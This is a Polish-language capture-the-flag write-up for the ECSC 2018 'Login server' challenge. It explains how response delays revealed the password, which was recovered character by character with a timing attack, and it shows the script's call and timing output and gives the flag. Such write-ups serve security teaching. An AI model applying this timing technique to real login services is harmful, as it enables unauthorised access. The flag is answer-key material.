# Login server (misc, 300 pkt)
Arkadiusz Kozdra

# Treść
> ~There is a mysterious service that I have no idea how to hack.~
>
> *Update 2018-06-19 12:30:*
>
> There is a mysterious service that I have no **time** to hack.
>
> We have also changed the password. Now it's the flag.
>
> ```
> nc ecsc18.hack.cert.pl 10013
> ```
>
> Format flagi: `ecsc{litery_cyfry_i_znaki_specjalne}`.

# Rozwiązanie
Uwagę zwraca pogrubione słowo **time**. Po połączeniu z serwerem dostajemy pytanie o hasło:
```
$ nc ecsc18.hack.cert.pl 10013
AWSUM Login Server(tm)
Please enter password: 
```

Podajemy dowolne losowe hasło, ale serwer niestety nas nigdzie nie wpuszcza:
```
Invalid password!
```

Interesujące jest to, że dość długo czekamy na odpowiedź serwera (około 100ms).
Przy wpisaniu hasła `ecsc{litery_cyfry_i_znaki_specjalne}` dostajemy odpowiedź
po znacznie dłuższym czasie (około 500ms). Rozwiązaniem powinien być atak timingowy.

Niestety trudno jest precyzyjnie dobrać parametry przycięcia wyników, pełna
automatyzacja jest zbyt czasochłonna do napisania, wystarczył zatem skrypt [login-server.py](login-server.py).
Przykładowe wywołanie programu:


```py
$ python3 login-server.py PWD='ecsc{timing_attacks_are_' ALLOWED='abcdefghijklmnopqrstuvwxyz1234567890_'
[+] Opening connection to ecsc18.hack.cert.pl on port 10013: Done
Reference: 2.258123270670573
0.54 3.857176733016968
0.04 2.346260499954224
0.95 5.82721848487854
0.04 2.3450202465057375
0.04 2.3490178108215334
0.04 2.344088983535767
0.04 2.344903898239136
0.04 2.342765283584595
0.54 3.861946535110474
0.04 2.3408860683441164

Average:
0.14010958663559675
probably the right prefix!
a 0.9975909953445186
b 0.9986598041061736
c 1.0004796196887256
d 1.0003714452851078
e 1.0167878304531466
f 1.0042942575091551
g 0.9995609615646833
h 0.9990838782042958
i 1.000253886466639
j 0.9993935638943718
k 1.0226239219590032
l 1.0000010145313354
m 0.999816496644742
n 1.0321271637924319
o 0.9990284594301094
p 0.9984847974508481
q 0.9997128876321326
r 0.9990547104284082
s 1.0001665099553931
t 0.9994113181927383
u 1.0019678103410774
v 0.9991953498347531
w 1.0006504414022934
x 0.9994459390745527
y 0.9991999152257617
z 1.0003231282302678
1 1.0000726658068853
2 1.000359144092668
3 1.0000029167775888
4 0.9991844436228996
5 1.0000154716028622
6 1.000645749194868
7 0.9986114870513337
8 0.9989426047158664
9 1.0000068480865127
0 0.998975703800678
_ 1.0049576341859725
---
b'ecsc{timing_attacks_are_f' 0.6293675422668457
b'ecsc{timing_attacks_are_n' 0.6468097686767578
b'ecsc{timing_attacks_are__' 0.629783264795939
b'ecsc{timing_attacks_are_k' 0.6408543109893798
b'ecsc{timing_attacks_are_e' 0.6371969699859619
```

Tak dochodzimy do flagi: `ecsc{timing_attacks_are_nasty_guys}`.

